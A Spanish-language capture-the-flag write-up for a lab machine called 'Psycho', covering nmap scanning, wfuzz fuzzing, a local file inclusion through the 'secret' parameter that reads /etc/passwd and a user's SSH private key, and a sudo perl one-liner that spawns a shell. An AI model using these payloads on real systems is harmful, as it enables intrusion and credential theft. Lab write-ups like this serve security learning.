# Psycho
> Dificultad: Fácil

___

#### FASE RECOPILACIÓN:  

Primero, buscamos los puertos, servicios y versiones con nmap:  

 `nmap -n -v -sV -sC --min-rate 5000 <IP>`  

[IMG]  

 Vemos que está abierto el puerto 80, el cual habla de una web-app. Una vez aclarado esto, proseguimos con una Enumeración Web usando, en este caso, `wfuzz`:  

 `wfuzz -c --hc 404 -t 200 -z file,<diccionario> -u "http://<IP>/FUZZ"`  

 Los más importante que aparece es el `index.php`. Entonces, dado que no hay más, proseguimos con fuzzear por Parámetros URL en dicho recurso con `wfuzz` nuevamente:  
 
 `wfuzz -c --hc 404 -t 200 -z file,rockyou.txt -u "http://<IP>/index.html?FUZZ=1"`  

Entramos a `secret`.  

Bien, probando y probando, encotramos que podemos intentar un LFI en dicho parámetro. Queda:  

`wfuzz -c --hc 404 -t 200 -z list,"../../../../../etc/passwd" -u http://<IP>/index.php?secret=FUZZ"`  

o directamente en el navegador.  

#### FASE EXPLOTACIÓN:  

Bien, conseguimos leer el archivo `/etc/passwd` con lo cual podemos Enumerar Usuarios. Encontramos a `luisillo`, `ubuntu` y `vaxei`.  

Bien, de la misma manera que leimos `/etc/passwd` podemos seguir buscando otros ficheros importantes del sistema, como por ejemplo, `http://<IP>/index.php?secret=../../../../../../../home/vaxei/.ssh/id_rsa`. Mediante el mismo, podemos tener acceso a la Clave Privada del usuario `vaxei`, por lo cual ya podemos tener acceso al sistema:  

Copiamos dicha clave localmente e intentamos `ssh -i id_rsa vaxei@<IP>`. Hacemos `whoami`. Tenemos acceso.  

#### FASE POST-EXPLOTACIÓN (Escalar Privilegios):  

Una de las primeras cosas que debemos hacer cuando ya tenemos un pie adentro es ver los **privilegios sudo**:  

`sudo -l` ==>  `sudo -u luisillo perl -e 'exec "/bin/bash";'`  





